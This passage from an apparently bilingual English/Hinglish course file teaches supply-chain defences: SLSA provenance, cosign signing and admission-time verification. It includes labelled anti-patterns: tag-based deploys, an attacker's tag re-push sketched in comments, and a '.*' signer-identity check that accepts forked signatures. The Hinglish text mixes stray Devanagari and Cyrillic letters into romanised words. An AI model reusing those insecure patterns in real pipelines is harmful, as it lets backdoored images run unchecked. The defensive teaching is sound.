Ek vulnerability scan ek sawaal ka jawaab deता hai: kya is artifact mein known flaws wale components hain? Ye ek alag aur equally important sawaal ka jawaab nahi deता: kya ye artifact wo hai jо aapki pipeline ne aapke source se build kiya, ya ye kुछ aur hai jо same registry coordinates par end hua? Container tags mutable pointers hain — push access wala koi bhi \`registry/app:v1.4.2\` ko ek completely different image par re-point kar sakता hai. SolarWinds compromise canonical demonstration hai ki ye matter karता hai: attackers ne kabhi public source repository modify nahi ki. Unhone malicious code build process mein khud inject kiya, to jо artifact bahar aaya — signed, versioned, aur official channel ke through shipped — ek backdoor contain karता tha jabki disk par source clean dikhता tha.

## Build provenance

Provenance ek machine-readable, signed record hai ki ek artifact kaise produce hua, us artifact ke content digest se cryptographically bound. Ek provenance attestation state karता hai: source repository aur exact commit jо build kiya gaya; builder ki identity — konsा CI platform, konsा workflow definition, konsा specific run; build ka entry point aur parameters; consumed materials, matlab jо dependencies aur base images gaye; aur, higher assurance levels par, ki build ek isolated environment mein run hua aur reproducible hai. Crucially ye build platform DWARA generated hai, na ki build ho rahe code dwara.

## SLSA

SLSA — Supply-chain Levels for Software Artifacts — ek framework hai jо build integrity ko levels ki ek ladder ke roop mein describe karता hai. Level 0 koi guarantees nahi hai. Level 1 ka matlab provenance exist karता hai: build platform ise generate karता hai. Ye apne aap koi attack catch nahi karता, par ye builds ko auditable banाता hai. Level 2 ka matlab provenance ek hosted build platform dwara signed hai aur source version-controlled hai. Level 3 ka matlab build ek isolated, ephemeral environment mein run hota hai aur provenance unforgeable hai — builder ki signing key build steps ke andar se reachable nahi hai. SLSA v1.0 Level 3 par rukता hai; koi Level 4 nahi hai. Zyादातर organisations pehle Level 2 target karती hain.

## Sigstore aur cosign

Traditional code signing ke liye ek certificate authority ya ek key-management server chalाना aur long-lived private keys protect karना zaroori hai, jо itni friction hai ki zyादातर projects ne kabhi kुछ sign nahi kiya. Sigstore wo friction remove karता hai. Iske recommended keyless mode mein, cosign Fulcio se ek short-lived signing certificate paता hai, ek certificate authority jо ek OIDC identity se bound certificates issue karता hai — CI mein, wo identity workflow ka apna OIDC token hai. Cosign artifact ko ephemeral key se sign karता hai, signature ko Rekor mein record karता hai, ek public append-only transparency log, aur key discard kar deता hai. Chुराने ke liye koi long-lived private key nahi hai. Key-based mode abhi bhi exist karता hai aur reason karने mein simpler hai — \`cosign generate-key-pair\` ek private aur public key produce karता hai — par aap ab private key ko ek KMS mein store karने aur ise rotate karने ke liye responsible ho.

## Admission par verify karo

Signing sirf tab useful hai agmar kुछ artifact ke run hone se pehle signature check karता hai. Kubernetes mein ye ek admission controller hai — Sigstore policy-controller, Kyverno, Connaisseur — jо har pod creation intercept karता hai aur, ise allow karने se pehle, image reference ko ek digest par resolve karता hai aur verify karता hai ki us digest par ek allowlist par ek identity se ek valid signature hai, ki ek provenance attestation exist karता hai jо expected source repository aur workflow name karता hai. Agmar koi required check fail hoता hai, pod reject ho jaता hai aur kabhi start nahi hota. Ye wo hai jо signing ko ek label se ek enforced control mein badalता hai. Ek prerequisite ye hai ki aap har jagah tag ke bजाय digest se deploy karते ho.`,

    examples: [
      {
        title: 'cosign: sign a release artifact, verify it, and watch verification fail on a tampered copy',
        titleHi: 'cosign: ek release artifact sign karो, ise verify karो, aur ek tampered copy par verification fail hote dekhो',
        code: `# VERIFY
mkdir rel && cd rel
export COSIGN_PASSWORD=""

# key-based signing (keyless needs a live OIDC identity + Fulcio; the trust model is identical)
cosign generate-key-pair >/dev/null 2>&1        # -> cosign.key (private), cosign.pub (public)
echo "keypair generated: cosign.key + cosign.pub"

# the artifact the pipeline produced (stands in for an image manifest / a binary)
cat > release.json <<'JSON'
{"name":"api-server","version":"1.4.2","git_sha":"9f2c1a0","builder":"github-actions"}
JSON

# SIGN it (offline: skip the Rekor transparency-log upload)
cosign sign-blob --key cosign.key --tlog-upload=false --yes release.json > release.sig 2>/dev/null
echo "signed -> release.sig"

echo "--- deploy step verifies the GENUINE artifact (it has only cosign.pub) ---"
cosign verify-blob --key cosign.pub --signature release.sig --insecure-ignore-tlog=true release.json 2>&1

echo "--- attacker swaps in a backdoored build, reuses the old signature ---"
sed -i 's/api-server/api-server-backdoored/' release.json
cosign verify-blob --key cosign.pub --signature release.sig --insecure-ignore-tlog=true release.json 2>&1 || echo "[exit $?]"`,
        output: `keypair generated: cosign.key + cosign.pub
signed -> release.sig
--- deploy step verifies the GENUINE artifact (it has only cosign.pub) ---
WARNING: Skipping tlog verification is an insecure practice that lacks of transparency and auditability verification for the blob.
Verified OK
--- attacker swaps in a backdoored build, reuses the old signature ---
WARNING: Skipping tlog verification is an insecure practice that lacks of transparency and auditability verification for the blob.
Error: invalid signature when validating ASN.1 encoded signature
main.go:74: error during command execution: invalid signature when validating ASN.1 encoded signature
[exit 1]`,
        explain: 'The mechanics of artifact signing, shown with a blob because it needs no registry. The pipeline generates a keypair, produces the release artifact, and signs it with the private key; only \`release.sig\` and the public key travel onward. The deploy step has just the public key, and \`verify-blob\` confirms that the signature matches the artifact exactly — "Verified OK". Then the attacker does what a mutable-tag or compromised-registry attack looks like in practice: they replace the artifact with a backdoored build and try to pass off the original signature with it. Verification fails immediately, because the signature is a cryptographic function of the artifact\'s bytes and those bytes changed. This is the whole point of signing in the supply chain: it does not matter how the substituted artifact got to the deploy step — a re-pushed tag, a poisoned registry mirror, a man-in-the-middle — verification against a trusted public key catches the substitution. The two warnings about skipping the transparency log are there because this example runs offline; in a real keyless setup cosign would record the signature in Rekor and verification would additionally confirm the signing identity — the exact GitHub Actions workflow — against a policy.',
        explainHi: 'Artifact signing ki mechanics, ek blob ke saath dikhाya kyunki ise koi registry nahi chahिए. Pipeline ek keypair generate karता hai, release artifact produce karता hai, aur ise private key se sign karता hai; sirf \`release.sig\` aur public key aage travel karते hain. Deploy step ke paas sirf public key hai, aur \`verify-blob\` confirm karता hai ki signature artifact se exactly match karता hai — "Verified OK". Phir attacker wo karता hai jо ek mutable-tag ya compromised-registry attack practice mein dikhता hai: wo artifact ko ek backdoored build se replace karते hain aur iske saath original signature pass off karने ki koshish karते hain. Verification turant fail hoती hai, kyunki signature artifact ke bytes ka ek cryptographic function hai aur wo bytes change ho gaye. Ye supply chain mein signing ka poora point hai. Transparency log skip karने ke baare mein do warnings isliye hain kyunki ye example offline run hota hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# deploy by TAG, and "verify" by trusting the registry
  # k8s Deployment:
  image: myreg.io/app:v1.4.2               # <-- a mutable tag
  # pipeline:  docker build -t myreg.io/app:v1.4.2 . && docker push myreg.io/app:v1.4.2
  # deploy:    kubectl set image ... app=myreg.io/app:v1.4.2
  #
  # an attacker with a leaked registry token (or a compromised CI) runs:
  #   docker pull myreg.io/app:v1.4.2         # get the real one
  #   ... inject backdoor ...
  #   docker push myreg.io/app:v1.4.2         # re-point the SAME tag
  # your next rollout, or any pod reschedule, pulls the backdoored image. the git
  # SHA in your deploy logs is unchanged. the CVE scan (run at build) still says clean.
  # nothing anywhere verifies that the running bytes are the bytes you built.`,
        right: `# sign at build, deploy by DIGEST, verify at admission
  # 1. build, get the immutable digest, sign THAT:
  DIGEST=$(docker buildx build --push -q -t myreg.io/app:v1.4.2 .)   # sha256:...
  cosign sign --key env://COSIGN_KEY "myreg.io/app@\${DIGEST}"
  cosign attest --predicate sbom.cdx.json --type cyclonedx "myreg.io/app@\${DIGEST}"
  # 2. deploy references the DIGEST, not the tag:
  image: myreg.io/app@sha256:<digest>
  # 3. an admission controller (policy-controller / Kyverno) enforces, per namespace:
  #    - a valid cosign signature over this digest
  #    - from certificate-identity = the release workflow's OIDC identity
  #    - a provenance attestation naming the expected repo + ref
  #    fail any check -> the Pod is REJECTED at admission, never scheduled.
  # re-pushing the tag now does nothing: the digest is different, unsigned by the
  # allowed identity, and rejected before it runs.`,
        why: 'Deploying by tag and trusting the registry means the only thing standing between your cluster and an arbitrary image is push access to one registry namespace, which is a single credential and a single compromise away from being someone else\'s. A tag is a name that currently points at a digest; re-pushing the tag repoints it, and nothing about your git history, your deploy logs, or a build-time CVE scan changes when that happens, so the substitution is invisible. The fix has three parts that only work together. Sign the artifact at build time, binding a signature to the immutable content digest — not the tag. Deploy by that digest everywhere, so the thing that runs is exactly the thing that was signed. And enforce verification at admission: an admission controller that resolves the image, checks for a valid signature over that digest from the specific allowed identity, and checks that a provenance attestation names the repository and workflow you expect, rejecting the pod if any check fails. With all three in place, a re-pushed tag produces a different digest that carries no valid signature from the allowed identity, and it is refused before it schedules.',
        whyHi: 'Tag se deploy karना aur registry ko trust karना ka matlab aapke cluster aur ek arbitrary image ke beech khadी ekmatra cheez ek registry namespace tak push access hai, jо ek single credential aur ek single compromise door hai kisi aur ki hone se. Ek tag ek naam hai jо currently ek digest par point karता hai; tag re-push karना ise repoint karता hai, aur aapki git history, deploy logs, ya ek build-time CVE scan ke baare mein kुछ change nahi hota jab wo hota hai. Fix ke teen parts hain jо sirf ek saath kaam karते hain. Build time par artifact sign karो, ek signature ko immutable content digest se bind karके. Us digest se har jagah deploy karो. Aur admission par verification enforce karो: ek admission controller jо image resolve karता hai, us digest par specific allowed identity se ek valid signature check karता hai.',
      },
      {
        wrong: `# generate provenance / an attestation, but never verify it anywhere
  # CI:  cosign attest --predicate provenance.json --type slsaprovenance app@sha256:...
  #      "SLSA L1 achieved" goes in the compliance deck.
  # deploy:  kubectl apply -f deployment.yaml    # <-- no verification step at all
  #
  # the attestation sits in the registry, signed, correct, and completely unused.
  # a build from a fork, a build with a tampered step, an image someone pushed by
  # hand - all deploy exactly the same, because nothing reads the attestation.
  # provenance you generate but don't check is documentation, not a control.`,
        right: `# the attestation is only worth what the verification policy enforces
  # admission policy (Sigstore policy-controller ClusterImagePolicy):
  #   images: ["myreg.io/*"]
  #   authorities:
  #     - keyless:
  #         identities:
  #           - issuer: https://token.actions.githubusercontent.com
  #             subject: https://github.com/acme/app/.github/workflows/release.yml@refs/heads/main
  #   attestations:
  #     - name: must-have-slsa-provenance
  #       predicateType: https://slsa.dev/provenance/v1
  #       policy:                       # CUE/Rego: assert fields INSIDE the provenance
  #         - buildDefinition.externalParameters.workflow.repository == "https://github.com/acme/app"
  #         - runDetails.builder.id startsWith "https://github.com/acme/app/.github/workflows/"
  # now: no provenance -> rejected. provenance from a fork / wrong workflow -> rejected.
  # provenance whose recorded repo != acme/app -> rejected. the attestation does work.`,
        why: 'An attestation is a signed claim about an artifact; it has value only in proportion to what is checked against it at the point of use. Generating SLSA provenance in CI and storing it alongside the image, with no verification step in the deploy path, produces a signed document that nothing reads — which means a build triggered from a fork, a build where a malicious step altered the output, or an image pushed to the registry by hand all reach production identically, because the gate that would distinguish them does not exist. The provenance in that setup is compliance evidence, not a security control. To make it a control, the deploy path must verify it: an admission policy that requires a provenance attestation of the expected predicate type, signed by the expected identity, and then inspects the fields inside the provenance — the recorded source repository, the builder ID, the workflow path, the trigger — and rejects the artifact if any of them is not what policy expects. Only then does "we have provenance" translate into "an artifact built the wrong way cannot run".',
        whyHi: 'Ek attestation ek artifact ke baare mein ek signed claim hai; iski value sirf us proportion mein hai jо use ke point par iske against check kiya jaता hai. CI mein SLSA provenance generate karना aur ise image ke saath store karना, deploy path mein koi verification step ke bina, ek signed document produce karता hai jise kुछ nahi padhता — jिska matlab ek fork se triggered build, ek build jahaan ek malicious step ne output alter kiya, ya ek image jо hand se registry par pushed hua sab production tak identically pahunchते hain. Us setup mein provenance compliance evidence hai, ek security control nahi. Ise ek control banाने ke liye, deploy path ko ise verify karना chahिए: ek admission policy jо expected predicate type ki ek provenance attestation require karती hai, expected identity dwara signed, aur phir provenance ke andar fields inspect karती hai.',
      },
      {
        wrong: `# keyless signing, but the verification policy accepts ANY GitHub identity
  cosign verify \\
    --certificate-identity-regexp=".*" \\                    # <-- any subject
    --certificate-oidc-issuer=https://token.actions.githubusercontent.com \\
    myreg.io/app@sha256:...
  # "it's signed by a GitHub Actions workflow" - yes, but WHICH one?
  # an attacker forks your repo, runs YOUR release workflow in THEIR fork (it's
  # public), and gets a perfectly valid Fulcio cert + signature - issued to
  #   subject: https://github.com/attacker/app/.github/workflows/release.yml@...
  # your regexp ".*" accepts it. the backdoored image verifies fine.`,
        right: `# pin the exact identity: issuer AND subject (repo + workflow + ref)
  cosign verify \\
    --certificate-oidc-issuer=https://token.actions.githubusercontent.com \\
    --certificate-identity=https://github.com/acme/app/.github/workflows/release.yml@refs/heads/main \\
    myreg.io/app@sha256:<digest>
  # now the signature must come from:
  #   - the acme/app repo (not a fork)
  #   - the release.yml workflow (not some other workflow in the repo)
  #   - the main branch ref (not a PR branch, not a tag an attacker can push)
  # a fork's signature has subject github.com/attacker/app/... -> rejected.
  # in an admission ClusterImagePolicy, express the same as an exact 'subject:'.`,
        why: 'Keyless signing binds a signature to an OIDC identity rather than a private key, and the security of the scheme is entirely in verifying that the identity is the specific one you trust. The identity in CI has two parts: the issuer, which says the token came from GitHub Actions, and the subject, which says exactly which repository, which workflow file, and which git ref produced it. Verifying only the issuer, or matching the subject with a permissive pattern like \`.*\`, accepts a signature from any GitHub Actions run anywhere — and because public repositories can be forked and their workflows run by anyone, an attacker can fork your project, run your release workflow in their fork, and obtain a completely valid signing certificate whose subject names their fork. A permissive verification policy accepts that certificate, and the backdoored image it signed verifies successfully. The fix is to pin the full identity: the exact issuer and the exact subject string, including the repository path, the workflow file, and the branch ref, so that only your release workflow on your main branch produces a signature the policy will accept.',
        whyHi: 'Keyless signing ek signature ko ek private key ke bजाय ek OIDC identity se bind karता hai, aur scheme ki security poori tarah verify karने mein hai ki identity wo specific one hai jise aap trust karते ho. CI mein identity ke do parts hain: issuer, jо kehта hai token GitHub Actions se aaya, aur subject, jо kehта hai exactly konsा repository, konsा workflow file, aur konsा git ref ne ise produce kiya. Sirf issuer verify karना, ya subject ko \`.*\` jaise ek permissive pattern se match karना, kisi bhi GitHub Actions run se ek signature accept karता hai — aur kyunki public repositories fork ho sakती hain aur unke workflows kisi bhi dwara run ho sakते hain, ek attacker aapkा project fork kar sakता hai, apne fork mein aapkा release workflow run kar sakता hai, aur ek completely valid signing certificate obtain kar sakта hai. Fix full identity pin karना hai.',
      },
    ],

    realWorld: [
      {
        en: '**SolarWinds (2020)** — attackers compromised the build system and injected the SUNBURST backdoor into Orion during compilation. The source repo was clean; the shipped, digitally-signed build was not. This is the incident that drove SLSA: the defence is not "scan the source" but "make the build tamper-evident and verify how each artifact was produced".',
        hi: '**SolarWinds (2020)** — attackers ne build system compromise kiya aur compilation ke dauraan SUNBURST backdoor Orion mein inject kiya. Source repo clean tha; shipped, digitally-signed build nahi tha. Ye wo incident hai jisne SLSA drive kiya.',
      },
      {
        en: '**npm keyless provenance** — since 2023 npm supports `npm publish --provenance` from GitHub Actions / GitLab, which mints a Sigstore-signed SLSA provenance attestation tying the package tarball to the exact repo, commit, and workflow, viewable on npmjs.com. Consumers can verify a package was built where it claims — a direct response to years of hijacked-maintainer-account attacks.',
        hi: '**npm keyless provenance** — 2023 se npm GitHub Actions / GitLab se `npm publish --provenance` support karता hai, jо ek Sigstore-signed SLSA provenance attestation mint karता hai jо package tarball ko exact repo, commit, aur workflow se tie karता hai.',
      },
      {
        en: '**Kubernetes image signing** — the Kubernetes project itself signs all its container images and binaries with cosign keyless since v1.24, publishing the expected identities so downstream users can enforce `cosign verify` in admission. Many regulated platforms now run policy-controller or Kyverno rules that reject any image without a signature from an allowlisted identity.',
        hi: '**Kubernetes image signing** — Kubernetes project khud v1.24 se apni saari container images aur binaries ko cosign keyless se sign karता hai, expected identities publish karता hai taaki downstream users admission mein `cosign verify` enforce kar sakें.',
      },
    ],

    interviewQA: [
      {
        q: 'Scanning says an artifact is clean. What question does signing and provenance answer that scanning does not, and why does it matter?',
        qHi: 'Scanning kehती hai ek artifact clean hai. Signing aur provenance konse sawaal ka jawaab dete hain jо scanning nahi deती?',
        a: 'Scanning answers "does this artifact contain known-vulnerable components". Signing and provenance answer "is this artifact the one your pipeline built from your source, and has it been unchanged since". Those are independent: an artifact can be free of known CVEs and still be the wrong artifact — one substituted at a mutable tag, served by a poisoned registry mirror, or produced by a compromised build. The SolarWinds compromise is the canonical case. The attackers never touched the public source repository; they injected code into the build process, so the artifact that shipped — signed with the vendor\'s real certificate, correctly versioned, distributed through the official update channel — carried a backdoor while the source on disk was clean. No amount of scanning the source, and not even scanning the artifact, reliably catches that, because the malicious code was purpose-built and not a known pattern. What was missing was a verifiable chain: a signed record of which commit was built, by which builder, with which steps, cryptographically bound to the artifact\'s digest, plus verification of that record before the artifact is trusted. Signing gives you tamper-evidence — the signature breaks if a byte changes. Provenance gives you origin — a claim, made by the build platform rather than the code, about how the artifact came to exist. Together they let a deploy step refuse an artifact that cannot prove it is a genuine build of genuine source, independent of whether it happens to be vulnerable.',
        aHi: 'Scanning jawaab deती hai "kya is artifact mein known-vulnerable components hain". Signing aur provenance jawaab dete hain "kya ye artifact wo hai jо aapki pipeline ne aapke source se build kiya, aur kya ye tab se unchanged hai". Wo independent hain: ek artifact known CVEs se free ho sakता hai aur phir bhi galat artifact ho sakता hai. SolarWinds compromise canonical case hai. Attackers ne kabhi public source repository touch nahi kiya; unhone code build process mein inject kiya, to jо artifact ship hua — vendor ke real certificate se signed — ek backdoor carry karता tha. Jо missing tha wo ek verifiable chain thi: konsा commit build kiya gaya, konse builder dwara, konse steps ke saath iska ek signed record, artifact ke digest se cryptographically bound. Signing tamper-evidence deता hai. Provenance origin deता hai.',
      },
      {
        q: 'Explain the SLSA levels and what each one defends against.',
        qHi: 'SLSA levels aur har ek kis ke against defend karता hai samjhाओ.',
        a: 'SLSA describes build integrity as a ladder. Level 0 is no guarantees. Level 1 means provenance exists — the build platform generates a record of how the artifact was built, even if nobody signs or verifies it. On its own it stops no attack, but it makes builds auditable: for any artifact you can now see what it claims to have been built from, which is the precondition for everything above. Level 2 means that provenance is signed by a hosted build platform and the source is in version control. Now tampering with the artifact after the build is detectable — verification of the signature against the artifact will fail if the bytes changed — and you have a cryptographic link from artifact to build to source. What Level 2 does not defend against is a malicious step running inside the build itself, which could still influence the output and, if it could reach the signing key, forge provenance for the tampered result. Level 3 closes that: the build runs in an isolated, ephemeral environment, and the provenance is unforgeable because the signing key is managed by the platform and is not reachable from within the build steps. So even a compromised build step cannot produce valid provenance for an artifact it tampered with. SLSA v1.0 stops at Level 3. Most organisations target Level 2 first because a hosted CI platform with signed provenance gets them most of the way there, and reserve Level 3 for their highest-value artifacts.',
        aHi: 'SLSA build integrity ko ek ladder ke roop mein describe karता hai. Level 0 koi guarantees nahi hai. Level 1 ka matlab provenance exist karता hai — build platform ek record generate karता hai ki artifact kaise build hua. Apne aap ye koi attack nahi rोkता, par ye builds ko auditable banाता hai. Level 2 ka matlab wo provenance ek hosted build platform dwara signed hai aur source version control mein hai. Ab build ke baad artifact ke saath tampering detectable hai. Jо Level 2 defend nahi karता wo build ke andar chal raha ek malicious step hai. Level 3 wo close karता hai: build ek isolated, ephemeral environment mein run hota hai, aur provenance unforgeable hai kyunki signing key platform dwara managed hai aur build steps ke andar se reachable nahi hai. SLSA v1.0 Level 3 par rukता hai. Zyादातर organisations pehle Level 2 target karती hain.',
      },
      {
        q: 'How does Sigstore keyless signing work, and what is the one thing a verification policy must get exactly right?',
        qHi: 'Sigstore keyless signing kaise kaam karता hai, aur ek cheez jо ek verification policy ko exactly right karना chahिए wo kya hai?',
        a: 'Keyless signing removes the long-lived private key. In CI, cosign takes the workflow\'s OIDC token — which asserts an identity like "the release workflow of this specific repository on this branch" — and exchanges it at Fulcio, a certificate authority, for a signing certificate valid for a few minutes and bound to that identity. Cosign signs the artifact by digest with the ephemeral key, records the signature and certificate in Rekor, a public append-only transparency log, and discards the key. There is no private key to store, rotate, or leak, and because every signature is logged publicly, you cannot sign something secretly. Verification checks that a signature exists over the artifact\'s digest, that the certificate chains to Fulcio, that the signing time falls within the certificate\'s validity and is anchored by a Rekor entry, and — the critical part — that the identity in the certificate is the one you trust. That identity has two components: the OIDC issuer, confirming the token came from GitHub Actions, and the subject, naming the exact repository, workflow file, and git ref. The one thing a policy must get exactly right is pinning that subject precisely. Accepting any subject, or matching it with a broad pattern, is a real vulnerability: public repositories can be forked and their workflows run by anyone, so an attacker forks your project, runs your release workflow in their fork, and gets a valid certificate whose subject is their fork. A loose policy accepts it. The policy must require the exact issuer and the exact subject — your repository, your release workflow, your release branch.',
        aHi: 'Keyless signing long-lived private key remove karता hai. CI mein, cosign workflow ka OIDC token leता hai — jо ek identity assert karता hai jaise "is specific repository ka release workflow is branch par" — aur ise Fulcio par exchange karता hai, ek certificate authority, ek signing certificate ke liye jо kुछ minutes ke liye valid hai aur us identity se bound hai. Cosign artifact ko digest se ephemeral key se sign karता hai, signature aur certificate ko Rekor mein record karता hai, aur key discard kar deता hai. Verification check karता hai ki artifact ke digest par ek signature exist karता hai, ki certificate Fulcio tak chain karता hai, aur — critical part — ki certificate mein identity wo hai jise aap trust karते ho. Ek cheez jо ek policy ko exactly right karना chahिए wo us subject ko precisely pin karना hai. Koi bhi subject accept karना ek real vulnerability hai: public repositories fork ho sakती hain.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain what build provenance is, why it must be generated by the build platform (not the code), and the SLSA L0-L3 ladder with the specific attack each level defends against.',
        taskHi: 'Ek comment mein, build provenance kya hai aur SLSA L0-L3 ladder samjhाओ.',
        hint: 'THE GAP: a vuln scan proves an artifact is CLEAN; it does NOT prove the artifact is the one YOUR pipeline built from YOUR source. Container tags are MUTABLE pointers — anyone with push access (or who compromises a push credential, or the CI itself) can re-point `registry/app:v1.4.2` at a different image; a deploy step that pulls "the image at that tag" runs it, and nothing in git history / deploy logs / a build-time CVE scan changes. SolarWinds is the canonical case: attackers NEVER touched the source repo — they injected code into the BUILD, so the signed, versioned, officially-shipped artifact carried a backdoor while the source on disk was clean. BUILD PROVENANCE = a machine-readable, SIGNED record of HOW an artifact was produced, cryptographically bound to the artifact\'s content DIGEST. It records: the source repo + exact commit SHA; the builder identity (which CI platform, which workflow file, which specific run); the build entry point + parameters; the materials/dependencies consumed; (at higher levels) that the build was isolated + reproducible. WHY THE BUILD PLATFORM, NOT THE CODE, GENERATES IT: if the code being built could write its own provenance, a compromised build step would simply write itself a favourable record. GitHub Actions / GitLab CI / Tekton Chains / Google Cloud Build emit it FOR the artifacts they produce, signed with a key the build steps can\'t reach. THE SLSA LADDER (Supply-chain Levels for Software Artifacts): L0 = no guarantees. L1 = provenance EXISTS (platform generates it, may be unsigned/unverified) → defends against NOTHING malicious directly, but makes every build AUDITABLE — you can now see what any artifact claims to be built from (the precondition for L2+). L2 = provenance is SIGNED by a hosted build platform + source is version-controlled → a TAMPER AFTER THE BUILD is detectable (signature verification fails if bytes changed); you have a crypto link artifact→build→source. Does NOT defend against a malicious step INSIDE the build. L3 = the build runs in an ISOLATED, EPHEMERAL environment + provenance is UNFORGEABLE (the signing key is platform-managed, NOT reachable from build steps) → defends against a MALICIOUS BUILD STEP tampering with the output AND forging provenance for it. SLSA v1.0 STOPS at L3 (no L4). Most orgs target L2 first (a hosted CI + signed provenance gets you most of the way), L3 for the highest-value artifacts.',
        hintHi: 'THE GAP: ek vuln scan saabit karता hai ek artifact CLEAN hai; ye NAHI saabit karता ki artifact wo hai jо AAPKI pipeline ne AAPKE source se build kiya. Tags MUTABLE pointers hain. SolarWinds: attackers ne source repo KABHI touch nahi kiya — unhone code BUILD mein inject kiya. BUILD PROVENANCE = ek machine-readable, SIGNED record ki ek artifact KAISE produce hua, artifact ke DIGEST se cryptographically bound. Records: source repo + commit SHA; builder identity (CI platform, workflow file, run); entry point + parameters; consumed materials; (higher levels) isolated + reproducible. BUILD PLATFORM KYUN, CODE NAHI: agar build ho raha code apni provenance likh sakता, ek compromised step apne aap ko ek favourable record likh deता. SLSA LADDER: L0 = koi guarantees nahi. L1 = provenance EXIST karता hai → kुछ malicious NAHI rोkता, par har build AUDITABLE. L2 = provenance SIGNED + source version-controlled → build ke BAAD ek TAMPER detectable. L3 = build ISOLATED, EPHEMERAL + provenance UNFORGEABLE (signing key build steps se reachable NAHI) → ek MALICIOUS BUILD STEP ke against defend. v1.0 L3 par RUKTA hai.',
      },
      {
        task: 'In a comment, explain Sigstore/cosign keyless vs key-based signing, what Fulcio and Rekor do, and walk through what `cosign verify-blob` checks (and the tamper failure).',
        taskHi: 'Ek comment mein, Sigstore/cosign keyless vs key-based signing samjhाओ.',
        hint: 'THE PROBLEM SIGSTORE SOLVES: traditional code signing needs you to run a CA or key server and protect long-lived private keys → enough friction that most projects signed NOTHING. KEYLESS MODE (recommended): cosign takes the CI workflow\'s OIDC TOKEN (asserts "the release workflow of THIS repo on THIS ref") → exchanges it at FULCIO (a CA) for a SHORT-LIVED signing certificate (valid ~minutes) BOUND to that OIDC identity → signs the artifact BY DIGEST with the ephemeral key → records the signature + certificate in REKOR (a public, append-only TRANSPARENCY LOG) → DISCARDS the key. Result: NO long-lived private key to store/rotate/leak; and because every signature is publicly logged, you CANNOT sign something secretly. KEY-BASED MODE: `cosign generate-key-pair` → `cosign.key` (private) + `cosign.pub` (public); sign with the private key, distribute the public one. Simpler to reason about, BUT you now own a private key → put it in a KMS / the CI secret store, rotate it. Same TRUST MODEL either way: a signature is a cryptographic function of the artifact\'s exact bytes. WHAT `cosign verify-blob` CHECKS: (1) a signature exists over THIS artifact\'s bytes/digest; (2) [keyless] the cert chains to Fulcio, the signing time is within cert validity + anchored by a Rekor entry; (3) [keyless] the certificate IDENTITY matches policy — `--certificate-oidc-issuer` (e.g. `https://token.actions.githubusercontent.com`) AND `--certificate-identity` (the EXACT subject: `https://github.com/acme/app/.github/workflows/release.yml@refs/heads/main`); [key] `--key cosign.pub` matches. Genuine artifact → "Verified OK", exit 0. THE TAMPER FAILURE: an attacker swaps in a backdoored build and reuses the old signature → verification fails IMMEDIATELY with "invalid signature when validating ASN.1 encoded signature", exit 1 — because the signature is a function of bytes that changed. It does NOT matter HOW the substituted artifact reached the deploy step (re-pushed tag, poisoned registry mirror, MITM) — verification against a trusted public key / pinned identity catches it. (Offline, you pass `--tlog-upload=false` + `--insecure-ignore-tlog=true` and cosign WARNS that you\'re skipping the transparency-log/auditability check — in a real keyless setup Rekor + the identity policy are part of the guarantee.)',
        hintHi: 'SIGSTORE JO PROBLEM SOLVE KARTA HAI: traditional signing ke liye ek CA/key server chalाना + long-lived keys protect karna → itni friction ki zyादातर projects ne KUCH sign nahi kiya. KEYLESS MODE: cosign CI workflow ka OIDC TOKEN leता hai → FULCIO (ek CA) par exchange karता hai ek SHORT-LIVED cert ke liye (BOUND to the OIDC identity) → artifact ko DIGEST se sign karता hai → signature + cert ko REKOR (public transparency log) mein record karता hai → key DISCARD. NO long-lived key; secretly sign nahi kar sakते. KEY-BASED: `cosign generate-key-pair` → `.key` + `.pub`; simpler par ab aap ek private key own karते ho (KMS mein, rotate). `verify-blob` KYA CHECK KARTA HAI: (1) THIS artifact ke bytes par ek signature; (2) [keyless] cert Fulcio tak chain + Rekor entry; (3) [keyless] IDENTITY policy se match — issuer AND EXACT subject. Genuine → "Verified OK". TAMPER: backdoored build + purani signature → turant fail, "invalid signature ... ASN.1", exit 1.',
      },
      {
        task: 'In a comment, explain admission-time verification: why signing without it is useless, deploy-by-digest, what an admission controller checks, and why pinning the exact signer identity matters.',
        taskHi: 'Ek comment mein, admission-time verification samjhाओ aur exact signer identity pin karna kyun matter karता hai.',
        hint: 'SIGNING WITHOUT VERIFICATION IS USELESS: an attestation / signature sitting in the registry, signed and correct, that NOTHING reads, is DOCUMENTATION not a CONTROL. A build from a fork, a build with a tampered step, an image someone pushed by hand — all deploy IDENTICALLY, because the gate that would distinguish them doesn\'t exist. "We have SLSA L1" in a compliance deck ≠ a security control. DEPLOY BY DIGEST, NOT TAG: a tag (`app:v1.4.2`) is a MUTABLE pointer to a digest; re-pushing the tag repoints it, invisibly. Verifying a signature over "whatever v1.4.2 currently means" defeats the purpose. Deploy `myreg.io/app@sha256:<digest>` everywhere → the thing that runs IS the thing that was signed. WHAT AN ADMISSION CONTROLLER CHECKS (Sigstore policy-controller / Kyverno / Connaisseur / Gatekeeper+provider — intercepts every Pod create): (1) resolve the image ref → a digest; (2) a VALID cosign signature over THIS digest; (3) from an identity on the ALLOWLIST (exact issuer + exact subject); (4) a PROVENANCE attestation of the expected predicateType, and — inspect the fields INSIDE it — recorded source repo == your repo, builder ID startsWith your workflows prefix, the trigger ref is your release branch; (5) optionally: an SBOM attestation, a passing-scan attestation. ANY required check fails → the Pod is REJECTED at admission, NEVER scheduled. A re-pushed tag now produces a DIFFERENT digest carrying NO valid signature from the allowed identity → refused before it runs. WHY PINNING THE EXACT SIGNER IDENTITY MATTERS: keyless binds the signature to an OIDC identity = issuer (came from GitHub Actions) + subject (EXACT repo + workflow file + git ref). Verifying ONLY the issuer, or matching the subject with a broad pattern (`--certificate-identity-regexp=".*"`), accepts a signature from ANY GitHub Actions run ANYWHERE. Public repos can be FORKED and their workflows run by anyone → an attacker forks your repo, runs YOUR `release.yml` in THEIR fork, gets a perfectly valid Fulcio cert with subject `github.com/attacker/app/.github/workflows/release.yml@...` → a loose policy accepts it, the backdoored image verifies fine. FIX: pin the EXACT issuer AND the EXACT subject — your repo path, your release workflow file, your release branch ref. In a ClusterImagePolicy, an exact `subject:`, not a regex.',
